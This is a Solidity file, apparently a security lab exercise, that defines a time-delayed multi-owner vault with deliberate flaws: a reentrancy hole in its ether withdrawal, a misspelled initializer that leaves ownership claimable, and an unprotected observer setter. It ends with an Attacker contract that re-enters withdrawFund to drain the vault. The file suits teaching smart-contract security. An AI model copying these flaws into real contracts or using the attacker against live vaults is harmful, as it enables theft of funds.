pragma solidity ^0.4.17;

contract BasicMultiOwnerVault {
    address public authorizedUsers;
    address public owner;
    address public withdrawObserver;
    address public additionalAuthorizedContract;
    address public proposedAAA;
    uint public lastUpdated;
    bool public votes;
    address public observerHistory;

    modifier onlyAuthorized() {
        bool pass = false;
        if(additionalAuthorizedContract == msg.sender) {
            pass = true;
        }
        
        if(authorizedUsers == msg.sender) {
            pass = true;
        }
        
        require (pass);
        _;
    }
    
    modifier onlyOnce() {
        require(owner == 0x0);
        _;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    modifier recordAction() {
        lastUpdated = now;
        _;
    }
    
    function initilizeVault() recordAction onlyOnce {
        owner = msg.sender;
    }
    
    function setObserver(address ob) {
        bool duplicate = false;
        if (observerHistory == ob) {
            duplicate = true;
        }
        
        if (!duplicate) {
            withdrawObserver = ob;
            observerHistory= ob;
        }
    }
    
    function addToReserve() payable recordAction external returns (uint) {
        assert(msg.value > 0.01 ether);
        return this.balance;
    }
    
    function basicWithdraw(address dst) internal returns (bool) {
        require(this.balance >= 0.0005 ether);
        bool res = dst.call.value(0.0005 ether)();
        return res;
    }
    
    function checkAllVote() private returns (bool) {
        if(!votes) {
            return false;
        }
        
        return true;
    }
    
    function clearVote() private {
        votes = false;
    }

    function addAuthorizedAccount(address proposal) onlyAuthorized external {
        require(msg.sender == authorizedUsers);
        if (proposal != proposedAAA) {
            clearVote();
            proposedAAA = proposal;
        }
        
        votes = true;
        if (checkAllVote()) {
            additionalAuthorizedContract = proposedAAA;
            clearVote();
        }
    }
    
    function resolve() onlyOwner {
        if(now >= lastUpdated + 12 hours) {
            selfdestruct(owner);
        }
    }

}

contract TimeDelayedVault is BasicMultiOwnerVault {
    uint  public nextWithdrawTime;
    uint  public withdrawCoolDownTime;
    
    function TimeDelayedVault() recordAction {
        nextWithdrawTime = now;
        withdrawCoolDownTime = 2 hours;
        this.call(bytes4(sha3("initializeVault()")));
       
        // Please note, the following code chunk is different for each group, all group members are added to authorizedUsers array
        authorizedUsers = 0x14723a09acff6d2a60dcdf7aa4aff308fddc160c;

        votes = false;
    }
    
    function withdrawFund(address dst) onlyAuthorized external returns (bool) {
        require(now > nextWithdrawTime);
        assert(withdrawObserver.call(bytes4(sha3("observe()"))));
        bool res = basicWithdraw(dst);
        nextWithdrawTime = nextWithdrawTime + withdrawCoolDownTime;
        return res;
    }
}

contract Attacker{
    uint public stack = 0;
    uint constant stacklimit = 10;
    uint public amount;
    TimeDelayedVault vault;

    function Attacker(address vaultAddress) payable {
        vault = TimeDelayedVault(vaultAddress);
    }
    
    function attack(){
        vault.withdrawFund(this);
    }

    function() payable {
        if(stack++ < 10){
            vault.withdrawFund(this);
        }
    }
    
}
